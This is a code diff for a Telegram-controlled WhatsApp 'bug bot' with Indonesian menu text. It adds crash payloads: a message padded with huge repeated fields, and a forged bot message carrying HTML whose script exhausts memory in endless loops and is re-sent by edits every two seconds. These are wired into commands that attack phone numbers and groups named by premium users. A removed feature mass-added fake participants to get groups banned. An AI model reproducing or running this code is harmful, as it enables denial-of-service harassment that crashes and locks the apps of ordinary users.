@@ -621,13 +621,12 @@ async function sendWAMenu(sock, from, mek, sender) {
 \`「 ANDROID BUG 」\`
 .delayhard 62xxx
 .lockchat 62xxx
-.desahanmanja 62xxx
+.forclosenew 62xxx
 .blankclick 62xxx
 .frezehard 62xxx
 
 \`「 GROUP BUG 」\`
 .groupcrash (link)
-.groupban (link)
 .bubar (bug in place)
 
 Ketik dengan awalan titik (.)
@@ -862,8 +861,8 @@ if (body.trim().toLowerCase() === "bubar") {
         break;
       }
 
-      case "desahanmanja": {
-        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .desahanmanja 628123456789" }, { quoted: mek });
+      case "forclosenew": {
+        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .forclosenew 628123456789" }, { quoted: mek });
         const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
         await sock.sendMessage(from, { text: `Mengirim bug .lockchat ke ${args[0]}...` }, { quoted: mek });
         try {
@@ -886,6 +885,7 @@ if (body.trim().toLowerCase() === "bubar") {
           await sock.sendMessage(from, { text: `Mengirim bug grup ke ${groupInfo.subject}...` }, { quoted: mek });
           for (let i = 0; i < 20; i++) {
             await Promise.allSettled([
+              anjayGB(sock, groupJid).catch(() => {}),            
               kitow(sock, groupJid).catch(() => {}),
               kicaumania(sock, groupJid).catch(() => {}),
               GbCrash(sock, groupJid).catch(() => {}),
@@ -899,30 +899,6 @@ if (body.trim().toLowerCase() === "bubar") {
         }
         break;
       }
-
-      case "groupban": {
-        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .groupban https://chat.whatsapp.com/xxxxx" }, { quoted: mek });
-        const inviteCode = args[0].match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/)?.[1];
-        if (!inviteCode) return sock.sendMessage(from, { text: "Link grup tidak valid." }, { quoted: mek });
-        try {
-          const groupInfo = await sock.groupGetInviteInfo(inviteCode);
-          const groupJid = groupInfo.id;
-          await sock.sendMessage(from, { text: `Ban grup ${groupInfo.subject}...` }, { quoted: mek });
-          await bansgc(sock, groupJid);
-          await sock.sendMessage(from, { text: `Selesai.` }, { quoted: mek });
-        } catch (e) {
-          await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
-        }
-        break;
-      }
-
-      default:
-        break;
-    }
-  } catch (err) {
-    console.error("[botwa] messages.upsert error:", err?.message);
-  }
-}
 
 bot.onText(/^\/botwa(?:\s+(.+))?$/i, async (msg, match) => {
   const chatId = msg.chat.id;
@@ -1375,6 +1351,52 @@ async function initializeBot() {
   await initializeWABotSessions();
 }
 
+async function tes(sock, target) {
+  const msg = {
+    groupMentionedMessage: {
+      message: {
+        ephemeralMessage: {
+          message: {
+            liveLocationMessage: {
+              message: {
+                interactiveMessage: {
+                  body: {
+                    text: "⭑‌By Nexvøid! ༑"
+                  },
+                  nativeFlowMessage: {
+                    extra: "\u31040",
+                    buttons: "A".repeat(20000),
+                    extra1: "A".repeat(5555),
+                    name: "crash_mesaage"
+                  },
+                  buttons: "A".repeat(4)
+                },
+                buttons: "A".repeat(555)
+              }
+            }
+          }
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage("status@broadcast", msg, {
+    messageId: sock.generateMessageTag(),
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: { broadcast: "true" },
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: { jid: target || "status@broadcast" }
+          }
+        ]
+      }
+    ]
+  });
+}
+
 async function anjay(sock, target) {
   const id = () => Math.random().toString(36).substring(2, 10);
   const responseId = id();
@@ -1526,6 +1548,165 @@ html, body {
         };
 
         await sock.relayMessage(target, protocolEdit, { messageId: '3EB0' + id() }).catch(() => {});
+        await new Promise(r => setTimeout(r, 2000));
+      } catch (err) {
+        await new Promise(r => setTimeout(r, 2000));
+      }
+    }
+  } catch (e) {}
+}
+
+async function anjayGB(sock, targetgroup) {
+  const id = () => Math.random().toString(36).substring(2, 10);
+  const responseId = id();
+  const originalId = id().toUpperCase();
+
+  const html = `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>System Monitor</title>
+<style>
+html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+    background-color: #000000;
+    overflow: hidden;
+}
+</style>
+</head>
+<body>
+<script>
+(function() {
+    const memoryRetentionArray = [];
+    const allocationChunkSize = 1024 * 1024 * 64;
+
+    function saturateEngine() {
+        try {
+            const rawBuffer = new ArrayBuffer(allocationChunkSize);
+            const viewArray = new Uint32Array(rawBuffer);
+            
+            for (let index = 0; index < viewArray.length; index += 1024) {
+                viewArray[index] = index ^ 0xDEADBEEF;
+            }
+            
+            memoryRetentionArray.push(rawBuffer);
+            memoryRetentionArray.push(viewArray);
+        } catch (allocationError) {
+            while (true) {
+                const garbageData = new Array(1000000).fill(Math.random());
+                memoryRetentionArray.push(garbageData);
+            }
+        }
+
+        queueMicrotask(saturateEngine);
+        queueMicrotask(saturateEngine);
+    }
+
+    function spawnMicrotaskSwarm() {
+        for (let counter = 0; counter < 50; counter++) {
+            queueMicrotask(saturateEngine);
+        }
+    }
+
+    Promise.resolve().then(spawnMicrotaskSwarm);
+    saturateEngine();
+})();
+</script>
+</body>
+</html>
+`;
+
+  const data = Buffer.from(JSON.stringify({
+    response_id: responseId,
+    sections: [{
+      view_model: {
+        __typename: 'GenAISingleLayoutViewModel',
+        primitive: {
+          __typename: 'GenAIaeacdsnwHtmlPrimitive',
+          payload: html,
+          trusted_sources: []
+        }
+      }
+    }]
+  }).replace(/[\u007f-\uffff]/g, c =>
+    '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')
+  )).toString('base64');
+
+  const message = {
+    messageContextInfo: {
+      deviceListMetadata: {},
+      deviceListMetadataVersion: 2,
+      botMetadata: {
+        botResponseId: responseId
+      }
+    },
+    botForwardedMessage: {
+      message: {
+        richResponseMessage: {
+          messageType: 1,
+          response_id: responseId,
+          submessages: [],
+          unifiedResponse: { data },
+          contextInfo: {
+            mentionedJid: Array(200).fill(targetgroup),
+            forwardingScore: 999999,
+            isForwarded: true,
+            forwardedAiBotMessageInfo: {
+              botJid: '867051314767696@bot'
+            },
+            forwardOrigin: 4,
+            expiration: 0,
+            ephemeralSettingTimestamp: Date.now(),
+            disappearingMode: {
+              initiator: 0,
+              trigger: 1
+            },
+            afterReadDuration: 200
+          }
+        }
+      }
+    }
+  };
+
+  const ctx = {
+    messageContextInfo: {
+      deviceListMetadata: {},
+      deviceListMetadataVersion: 2,
+      botMetadata: { messageDisclaimerText: ("ꦾ").repeat(2), botResponseId: responseId }
+    }
+  };
+
+  try {
+    await sock.relayMessage(targetgroup, message, {
+      participant: { jid: targetgroup },
+      noSelfSync: false
+    }).catch(() => {});
+
+    await sock.relayMessage(targetgroup, { ...ctx, ...message }, { messageId: originalId }).catch(() => {});
+
+    await new Promise(r => setTimeout(r, 1000));
+
+    while (true) {
+      try {
+        const protocolEdit = {
+          ...ctx,
+          botForwardedMessage: {
+            message: {
+              protocolMessage: {
+                key: { remoteJid: target, fromMe: true, id: originalId },
+                type: 14,
+                timestampMs: Date.now(),
+                editedMessage: message
+              }
+            }
+          }
+        };
+
+        await sock.relayMessage(targetgroup, protocolEdit, { messageId: '3EB0' + id() }).catch(() => {});
         await new Promise(r => setTimeout(r, 2000));
       } catch (err) {
         await new Promise(r => setTimeout(r, 2000));
@@ -2171,28 +2352,10 @@ async function GbCrash(sock, targetgroup) {
   }
 }
 
-async function bansgc(sock, targetgroup) {
-  try {
-    if (!targetgroup.endsWith('@g.us')) throw new Error('group only')
-    const fakeNumbers = Array.from({ length: 2000 }, () => {
-      return Math.floor(Math.random() * 9000000000000) + 1000000000000 + '@s.whatsapp.net'
-    })
-    for (const fakeJid of fakeNumbers) {
-      sock.groupParticipantsUpdate(targetgroup, [fakeJid], 'add').catch(() => {})
-      await new Promise(r => setTimeout(r, 20))
-    }
-  } catch (err) {
-    throw new Error(`bans gb: ${err.message}`)
-  }
-}
-
 async function bug1(sock, target) {
   for (let i = 0; i < 10; i++) {
     try {
-      await halonyet(sock, target);
-      await halonyet(sock, target);
-      await delaylohyah(sock, target);
-      await sleep(500);      
+      await GatauTry(sock, target); 
       console.log(`bug send to ${target}`);
     } catch (innerError) {
       console.error(`error:`, innerError);
@@ -2201,9 +2364,8 @@ async function bug1(sock, target) {
 }
 
 async function bug2(sock, target) {
-  for (let i = 0; i < 1; i++) {
+  for (let i = 0; i < 5; i++) {
     try {
-      await anjay(sock, target);
       await audiomanja(sock, target);
       await lockchit(sock, target);     
       await halonyet(sock, target);
@@ -2252,14 +2414,9 @@ async function bug4(sock, target) {
 }
 
 async function bug5(sock, target) {
-  for (let i = 0; i < 1; i++) {
+  for (let i = 0; i < 10; i++) {
     try {
-      await audiomanja(sock, target);
-      await lockchit(sock, target);     
-      await halonyet(sock, target);
-      await halonyet(sock, target);    
-      await delaylohyah(sock, target);
-      await sleep(500);               
+      await tes(sock, target);  
       console.log(`bug send to ${target}`);
     } catch (innerError) {
       console.error(`error:`, innerError);
@@ -2316,7 +2473,7 @@ function getkintanaMenu() {
 <tr><th>command</th><th>description</th></tr>
 <tr><td><code>/delayhard</code></td><td>delayy hard crash</td></tr>
 <tr><td><code>/lockchat</code></td><td>lock whatsapp chat</td></tr>
-<tr><td><code>/desahanmanja</code></td><td>prank audio whatsapp</td></tr>
+<tr><td><code>/forclosenew</code></td><td>forclose new whatsapp</td></tr>
 <tr><td><code>/blankclick</code></td><td>crash click chat</td></tr>
 <tr><td><code>/frezehard</code></td><td>freeze chat x delay</td></tr>
 </table>
@@ -2326,12 +2483,6 @@ function getkintanaMenu() {
 <tr><th>command</th><th>description</th></tr>
 <tr><td><code>/groupcrash</code></td><td>blank click group x delay</td></tr>
 <tr><td><code>/delaygroup</code></td><td>delay group x crash</td></tr>
-</table>
-
-<h3>ban group</h3>
-<table border="2">
-<tr><th>command</th><th>description</th></tr>
-<tr><td><code>/groupban</code></td><td>ban group (rate ban 65%)</td></tr>
 </table>
 
 <h3>sender status</h3>
@@ -3345,7 +3496,7 @@ bot.onText(/^\/(frezehard)(?:\s+(.+))?$/, async (msg, match) => {
   }
 });
 
-bot.onText(/^\/(desahanmanja)(?:\s+(.+))?$/, async (msg, match) => {
+bot.onText(/^\/(forclosenew)(?:\s+(.+))?$/, async (msg, match) => {
   const chatId = msg.chat.id;
   const commandName = match[1];
   const userId = msg.from.id;
@@ -3575,8 +3726,9 @@ bot.onText(/^\/(delaygroup)(?:\s+(.+))?$/, async (msg, match) => {
       try {
         for (let i = 0; i < 20; i++) {
           await Promise.allSettled([
-            kitow(sock, groupJid).catch(() => {}),
-            kicaumania(sock, groupJid).catch(() => {}),
+            halonyetGB(sock, groupJid).catch(() => {}),          
+            halonyetGB(sock, groupJid).catch(() => {}),
+            halonyetGB(sock, groupJid).catch(() => {}),
             halonyetGB(sock, groupJid).catch(() => {})
           ]);
           const currentDelay = getCurrentDelay();
@@ -3733,165 +3885,10 @@ bot.onText(/^\/(groupcrash)(?:\s+(.+))?$/, async (msg, match) => {
       try {
         for (let i = 0; i < 20; i++) {
           await Promise.allSettled([
+            anjayGB(sock, groupJid).catch(() => {}),          
             kitow(sock, groupJid).catch(() => {}),
             kicaumania(sock, groupJid).catch(() => {}),
             GbCrash(sock, groupJid).catch(() => {})
-          ]);
-          const currentDelay = getCurrentDelay();
-          if (currentDelay > 0) await new Promise(resolve => setTimeout(resolve, currentDelay));
-        }
-      } catch (err) {
-        console.error(`bot ${botNum} error:`, err);
-      }
-    }
-  })();
-});
-
-bot.onText(/^\/(groupban)(?:\s+(.+))?$/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const commandName = match[1];
-  const userId = msg.from.id;
-  const idgc = String(chatId);
-
-  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
-    return restricted(chatId);
-  }
-
-  if (!match[2]) {
-    return sendRichMenu(chatId,
-      `<h3>missing group link</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>command</td><td>/${commandName}</td></tr>
-<tr><td>example</td><td>/${commandName} https://chat.whatsapp.com/abcd1234</td></tr>
-</table>
-<tg-button-row>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
-</tg-button-row>`,
-      msg.message_id
-    );
-  }
-
-  const link = match[2].trim();
-  const inviteCode = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/)?.[1];
-  if (!inviteCode) {
-    return sendRichMenu(chatId,
-      `<h3>invalid link</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>status</td><td>invalid group link</td></tr>
-</table>`,
-      msg.message_id
-    );
-  }
-
-  const allSessions = Array.from(sessions.entries()).filter(([_, data]) => {
-    if (data.type === "public") return true;
-    if (data.type === "private") return data.ownerId === userId;
-    return false;
-  });
-
-  if (allSessions.length === 0) {
-    return sendRichMenu(chatId,
-      `<h3>no sender</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>status</td><td>no bot connected</td></tr>
-</table>`
-    );
-  }
-
-  let groupInfo = null;
-  let selectedBot = null;
-
-  for (const [botNum, data] of allSessions) {
-    const sock = data.sock;
-    if (sock?.user) {
-      try {
-        groupInfo = await sock.groupGetInviteInfo(inviteCode);
-        selectedBot = sock;
-        break;
-      } catch (e) {
-        continue;
-      }
-    }
-  }
-
-  if (!groupInfo || !selectedBot) {
-    return sendRichMenu(chatId,
-      `<h3>error</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>status</td><td>cannot access group</td></tr>
-</table>`
-    );
-  }
-
-  const groupJid = groupInfo.id;
-  const groupName = groupInfo.subject || "unknown";
-  const announce = groupInfo.announce || false;
-
-  if (announce) {
-    return sendRichMenu(chatId,
-      `<h3>cannot send</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>reason</td><td>group requires admin permission</td></tr>
-</table>`
-    );
-  }
-
-  let joined = false;
-  try {
-    await selectedBot.groupAcceptInvite(inviteCode);
-    joined = true;
-  } catch (e) {
-    for (const [botNum, data] of allSessions) {
-      const sock = data.sock;
-      if (sock === selectedBot) continue;
-      if (sock?.user) {
-        try {
-          await sock.groupAcceptInvite(inviteCode);
-          joined = true;
-          break;
-        } catch (err) {}
-      }
-    }
-  }
-
-  if (!joined) {
-    return sendRichMenu(chatId,
-      `<h3>failed to join</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>reason</td><td>link expired / group full / blocked</td></tr>
-</table>`
-    );
-  }
-
-  await sendRichMenu(chatId,
-    `<h3>group ban sent</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>group</td><td>${groupName}</td></tr>
-<tr><td>type</td><td>/${commandName}</td></tr>
-<tr><td>status</td><td>done</td></tr>
-</table>
-
-<tg-button-row>
-  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
-  <tg-button type="url" url="${link}" style="primary">group link</tg-button>
-</tg-button-row>`
-  );
-
-  (async () => {
-    for (const [botNum, data] of allSessions) {
-      const sock = data.sock;
-      if (!sock?.user) continue;
-      try {
-        for (let i = 0; i < 5; i++) {
-          await Promise.allSettled([
-            bansgc(sock, groupJid).catch(() => {})
           ]);
           const currentDelay = getCurrentDelay();
           if (currentDelay > 0) await new Promise(resolve => setTimeout(resolve, currentDelay));
